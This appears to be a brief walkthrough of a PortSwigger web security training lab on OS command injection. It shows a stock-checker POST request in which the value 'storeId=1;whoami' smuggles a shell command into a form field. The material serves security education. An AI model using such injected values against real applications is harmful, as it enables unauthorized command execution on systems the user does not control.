
# OS command injection, simple case

This lab contains an OS command injection vulnerability in the product stock checker.

The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

To solve the lab, execute the whoami command to determine the name of the current user.


---------------------------------------------

References: 

- https://portswigger.net/web-security/os-command-injection



![img](images/OS%20command%20injection,%20simple%20case/1.png)

---------------------------------------------






![img](images/OS%20command%20injection,%20simple%20case/2.png)
![img](images/OS%20command%20injection,%20simple%20case/3.png)


```
POST /product/stock HTTP/2
...

productId=1&storeId=1;whoami
```



![img](images/OS%20command%20injection,%20simple%20case/4.png)